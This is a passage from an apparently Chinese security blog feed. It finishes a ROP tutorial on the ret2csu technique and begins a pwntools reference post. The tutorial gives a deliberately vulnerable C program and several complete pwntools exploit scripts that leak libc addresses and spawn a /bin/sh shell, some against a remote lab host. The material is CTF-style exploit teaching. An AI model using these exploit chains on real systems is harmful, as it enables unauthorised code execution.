class="number">1024</span>).split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]recv system() addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc.address = system_addr - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = pop_rdi_ret_libc + libc.address</span></span><br><span class="line">pop_call_addr = pop_call_libc +libc.address</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh libc addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "A" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level5——通用gadgets"><a href="#level5——通用gadgets" class="headerlink" title="level5——通用gadgets"></a>level5——通用gadgets</h3><blockquote><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p></blockquote><p>level5.c代码如下，相比于level3和level4，去掉了提供system()或其地址的辅助函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段，最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p></blockquote><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o level5 level5.c</span><br></pre></td></tr></table></figure><p>基本功能和安全编译开关和前面的一致。</p><p>溢出偏移量也和之前的一致，为136。</p><p>用objdump -d ./level5观察一下__libc_csu_init()这个函数：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/31.png" alt=""></p><p>可以看到，利用0x40061a处的代码可以控制rbx、rbp、r12、r13、r14和r15的值，<strong>随后利用0x400600处的代码可以将r13的值赋值给rdx、r14的值赋值给rsi、r15的值赋值给edi（这和蒸米原文的顺序是相反的，因为本地编译出来的程序所用的gadget有些许区别，其实这里利用的就是ret2csu技巧）</strong>，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p><p>这里列两种getshell的方法。</p><h4 id="Method1——只用ret2csu的Gadget"><a href="#Method1——只用ret2csu的Gadget" class="headerlink" title="Method1——只用ret2csu的Gadget"></a>Method1——只用ret2csu的Gadget</h4><p>第一种是蒸米讲解的方法，即利用该gadget构造3段payload，分别是泄露write()函数地址、向程序.bss段写入”/bin/sh”和system()或execve()函数地址、传入bss_addr+8处的参数并调用bss_addr地址处的函数即执行system(“/bin/sh”)。</p><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment">#p = remote('192.168.17.155',10001)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(got_write)</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]read() got: "</span> + hex(got_read)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line"><span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line"><span class="comment"># rbx should be 0,</span></span><br><span class="line"><span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line"><span class="comment"># r12 should be the function we want to call</span></span><br><span class="line"><span class="comment"># rdi=edi=r15d</span></span><br><span class="line"><span class="comment"># rsi=r14</span></span><br><span class="line"><span class="comment"># rdx=r13</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">payload += p64(gadget2)</span><br><span class="line">payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 = csu(<span class="number">0</span>, <span class="number">1</span>, got_write, <span class="number">8</span>, got_write, <span class="number">1</span>, main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">execve_addr = libc.symbols[<span class="string">"execve"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]execve() addr: "</span> + hex(execve_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 = csu(<span class="number">0</span>, <span class="number">1</span>, got_read, <span class="number">16</span>, bss_addr, <span class="number">0</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(execve_addr))</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(rdi = bss_addr+8 = "/bin/sh", rsi=0, rdx=0)</span></span><br><span class="line">payload3 = csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, <span class="number">0</span>, <span class="number">0</span>, bss_addr + <span class="number">8</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload3#############\n"</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>简单说下：</p><ul><li>由于利用到泄露函数地址和向.bss段写内容的功能，需要先获取write()和read()函数的GOT地址；</li><li>本次利用的Gadget即ret2csu，定义一个csu函数，用于构造Gadget传参构造payload，其中payload构造是先填充溢出偏移量的字符、然后根据gadget1来设置对应寄存器的值、再调用gadget2、然后填充字符至gadget1的ret指令处、最后调用输入的返回地址即main处让程序继续执行下去；这里注意两个偏移量，第一个136是程序本身溢出到ret的偏移量，而第二个56则是gadget2跑完之后还要继续往下跑到gadget1的ret中去，这中间需要填充56个字节；</li><li>payload1利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止；</li><li>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着构造payload2，利用read()将system()或execve()的地址以及“/bin/sh”读入到.bss段内存中；</li><li>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</li></ul><p>在我的本地环境中，利用system()的exp会得不到shell，换了execve()才可以：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/32.png" alt=""></p><h4 id="Method2——利用两个Gadgets"><a href="#Method2——利用两个Gadgets" class="headerlink" title="Method2——利用两个Gadgets"></a>Method2——利用两个Gadgets</h4><p>其实不用向.bss段写内容再调用，有点繁琐，且同一个Gadget调用了3次。</p><p>除了利用ret2csu的gadget，这里还利用到pop rdi|ret这个gadget，主要用于给system(函数的第一个参数赋值并返回往下调用system()函数从而getshell：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/33.png" alt=""></p><p>基本利用过程就是：通过ret2csu的gadget泄露write()函数的真实地址，通过LibcSearcher或查询的方式得到libc的offset然后计算出system()函数和”/bin/sh”的真实地址，最后利用pop rdi|ret这个gadget构造exp执行system(“/bin/sh”)。</p><p>payload如下，下面将改为远程连接的形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level5')</span></span><br><span class="line">p = remote(<span class="string">'192.168.17.155'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400623</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">payload += p64(gadget2)</span><br><span class="line">payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write addr..."</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">exp += p64(pop_rdi_ret)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/34.png" alt=""></p><p>当然，也可以不用LibcSearcher这个工具包，而是直接通过查询Libc Database Search的方式自己写地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level5')</span></span><br><span class="line">p = remote(<span class="string">'192.168.17.155'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400623</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">payload += p64(gadget2)</span><br><span class="line">payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write addr..."</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">## libc db search</span></span><br><span class="line"><span class="comment">## leak write low 3: 2b0</span></span><br><span class="line">system_offset = <span class="number">0x045390</span></span><br><span class="line">binsh_offset = <span class="number">0x18cd57</span></span><br><span class="line">write_offset = <span class="number">0x0f72b0</span></span><br><span class="line">libc_base = write_addr - write_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">exp += p64(pop_rdi_ret)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/36.png" alt=""></p><p>getshell：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/35.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇</a></p><p><a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之Linux_x64篇</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwntools笔记</title>
    <link href="https://Mi1k7ea.github.com/2019/04/07/pwntools%E7%AC%94%E8%AE%B0/"/>
    <id>https://Mi1k7ea.github.com/2019/04/07/pwntools笔记/</id>
    <published>2019-04-07T14:52:27.000Z</published>
    <updated>2019-05-28T14:19:29.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>pwntools是一个CTF Pwn漏洞利用开发库，用于编写各种与Pwn题目进行交互和攻击利用的脚本。其由Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>安装：pip install pwntools</p><p>当然只是在Linux环境适用，建议安装在Ubuntu环境而非Kali，Kali上会有很多问题。其中对Ubuntu 12.04和14.04的支持最好，但是绝大多数的功能也支持Debian、Arch、FreeBSD、OSX等等。</p><h2 id="0x03-各个模块"><a href="#0x03-各个模块" class="headerlink" title="0x03 各个模块"></a>0x03 各个模块</h2><p>通常在py文件头部写上from pwn import *即可导入所有需要的pwntools工具。</p><h3 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh = porcess(<span class="string">"./test"</span>)<span class="comment">#连接本地程序</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)<span class="comment">#远程连接</span></span><br><span class="line">sh.close()<span class="comment">#关闭连接</span></span><br></pre></td></tr></table></figure><h3 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)<span class="comment">#发送数据</span></span><br><span class="line">sh.sendline(data)<span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line">sh.recv(numb = <span class="number">2048</span>, timeout = dufault)<span class="comment">#接受数据，numb指定接收的字节，timeout指定超时时间</span></span><br><span class="line">sh.recvline(keepends=<span class="keyword">True</span>)<span class="comment">#接受一行数据，keepends为是否保留行尾的\n</span></span><br><span class="line">sh.recvuntil(<span class="string">"Hello,World\n"</span>,drop=fasle)<span class="comment">#接受数据直到我们设置的标志出现</span></span><br><span class="line">sh.recvall()<span class="comment">#一直接收直到EOF</span></span><br><span class="line">sh.recvrepeat(timeout = default)<span class="comment">#持续接受直到EOF或timeout</span></span><br><span class="line">sh.interactive()<span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br></pre></td></tr></table></figure><h3 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.address)  <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) <span class="comment"># 函数地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.got[<span class="string">'write'</span>]) <span class="comment"># GOT表的地址</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.plt[<span class="string">'write'</span>]) <span class="comment"># PLT的地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.search(<span class="string">'/bin/sh'</span>).next())<span class="comment"># 字符串/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc相关</span></span><br><span class="line">libc = e.libc</span><br><span class="line">libc.address = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">next(libc.search(<span class="string">'/bin/sh'</span>))</span><br></pre></td></tr></table></figure><h3 id="整数pack与数据unpack"><a href="#整数pack与数据unpack" class="headerlink" title="整数pack与数据unpack"></a>整数pack与数据unpack</h3><p>pack：p32，p64<br>unpack：u32，u64</p><h3 id="汇编和反汇编"><a href="#汇编和反汇编" class="headerlink" title="汇编和反汇编"></a>汇编和反汇编</h3><p>汇编：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>)</span><br><span class="line"><span class="string">'\x90'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>, arch=<span class="string">'arm'</span>)</span><br><span class="line"><span class="string">'\x00\xf0 \xe3'</span></span><br></pre></td></tr></table></figure><p>可以使用context来指定cpu类型以及操作系统：</p><figure class="highlight python"><table><tr><td 